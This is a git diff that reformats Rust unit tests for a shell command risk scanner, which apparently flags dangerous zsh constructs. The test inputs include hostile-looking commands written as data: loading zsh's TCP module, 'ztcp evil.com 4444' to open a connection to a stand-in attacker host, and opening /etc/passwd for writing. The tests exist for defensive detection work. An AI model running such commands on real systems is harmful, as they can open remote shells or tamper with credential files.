@@ -511,25 +511,41 @@ mod tests {
     #[test]
     fn detect_zsh_dollar_equals() {
         let risks = analyze_command_risks("echo $=PATH");
-        assert!(risks.iter().any(|r| matches!(r, CommandRisk::ZshDangerous(_))));
+        assert!(
+            risks
+                .iter()
+                .any(|r| matches!(r, CommandRisk::ZshDangerous(_)))
+        );
     }
 
     #[test]
     fn detect_zmodload() {
         let risks = analyze_command_risks("zmodload zsh/net/tcp");
-        assert!(risks.iter().any(|r| matches!(r, CommandRisk::ZshDangerous(_))));
+        assert!(
+            risks
+                .iter()
+                .any(|r| matches!(r, CommandRisk::ZshDangerous(_)))
+        );
     }
 
     #[test]
     fn detect_ztcp() {
         let risks = analyze_command_risks("ztcp evil.com 4444");
-        assert!(risks.iter().any(|r| matches!(r, CommandRisk::ZshDangerous(_))));
+        assert!(
+            risks
+                .iter()
+                .any(|r| matches!(r, CommandRisk::ZshDangerous(_)))
+        );
     }
 
     #[test]
     fn detect_sysopen() {
         let risks = analyze_command_risks("sysopen -w fd /etc/passwd");
-        assert!(risks.iter().any(|r| matches!(r, CommandRisk::ZshDangerous(_))));
+        assert!(
+            risks
+                .iter()
+                .any(|r| matches!(r, CommandRisk::ZshDangerous(_)))
+        );
     }
 
     #[test]
@@ -538,6 +554,10 @@ mod tests {
         let risks = analyze_command_risks("echo 'use zmodload to load modules'");
         // Note: heuristic scanner WILL detect this (it's substring-based).
         // AST-based detection would not. The heuristic is conservative (false positives OK).
-        assert!(risks.iter().any(|r| matches!(r, CommandRisk::ZshDangerous(_))));
+        assert!(
+            risks
+                .iter()
+                .any(|r| matches!(r, CommandRisk::ZshDangerous(_)))
+        );
     }
 }
